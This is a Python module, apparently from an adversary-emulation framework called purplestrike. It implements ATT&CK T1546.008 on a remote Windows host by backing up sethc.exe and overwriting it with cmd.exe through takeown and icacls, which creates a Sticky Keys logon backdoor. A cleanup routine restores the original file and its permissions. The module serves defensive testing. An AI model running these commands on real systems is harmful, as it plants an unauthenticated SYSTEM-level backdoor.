from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, get_connection

logger = logging.getLogger(__name__)
_backed_up_targets: set[str] = set()


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    """Replace accessibility binary with cmd.exe for persistence."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        backup_cmd = (
            "$ErrorActionPreference = 'Stop'; "
            "if (Test-Path -LiteralPath 'C:\\Windows\\Temp\\purplestrike_sethc_backup.exe') "
            "{ throw 'Previous accessibility backup exists; restore it before rerunning' }; "
            "Get-Acl -LiteralPath 'C:\\Windows\\System32\\sethc.exe' | "
            "Export-Clixml -LiteralPath 'C:\\Windows\\Temp\\purplestrike_sethc_acl.xml'; "
            "Copy-Item -Path 'C:\\Windows\\System32\\sethc.exe' "
            "-Destination 'C:\\Windows\\Temp\\purplestrike_sethc_backup.exe' -Force"
        )
        backup = await conn.run_ps(backup_cmd)
        if not backup.success:
            raise RuntimeError(backup.stderr or backup.stdout or "Accessibility backup failed")
        _backed_up_targets.add(target)
        replace_cmd = (
            "takeown /f C:\\Windows\\System32\\sethc.exe; "
            "if ($LASTEXITCODE -ne 0) { throw 'Cannot take ownership of accessibility binary' }; "
            "icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F; "
            "if ($LASTEXITCODE -ne 0) { throw 'Cannot update accessibility binary permissions' }; "
            "Copy-Item -Path 'C:\\Windows\\System32\\cmd.exe' "
            "-Destination 'C:\\Windows\\System32\\sethc.exe' -Force"
        )
        result = await conn.run_ps(replace_cmd)
        return TechniqueResult(
            technique_id="T1546.008",
            success=result.success,
            output=result.stdout[:4096],
            error=result.stderr[:1024] if not result.success else None,
            execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1546.008 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1546.008",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Reverse any changes made during execution."""
    conn: TargetConnection | None = None
    try:
        if target not in _backed_up_targets:
            return
        conn = await get_connection(target)
        restore_cmd = (
            "$ErrorActionPreference = 'Stop'; "
            "if (-not (Test-Path -LiteralPath 'C:\\Windows\\Temp\\purplestrike_sethc_backup.exe')) "
            "{ return }; "
            "Copy-Item -Path 'C:\\Windows\\Temp\\purplestrike_sethc_backup.exe' "
            "-Destination 'C:\\Windows\\System32\\sethc.exe' -Force; "
            "$acl = Import-Clixml -LiteralPath 'C:\\Windows\\Temp\\purplestrike_sethc_acl.xml'; "
            "Set-Acl -LiteralPath 'C:\\Windows\\System32\\sethc.exe' -AclObject $acl; "
            "Remove-Item -LiteralPath 'C:\\Windows\\Temp\\purplestrike_sethc_backup.exe', "
            "'C:\\Windows\\Temp\\purplestrike_sethc_acl.xml' -Force"
        )
        restored = await conn.run_ps(restore_cmd)
        if not restored.success:
            raise RuntimeError(restored.stderr or restored.stdout or "Accessibility restore failed")
        _backed_up_targets.discard(target)
    except Exception as e:
        logger.warning(f"T1546.008 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
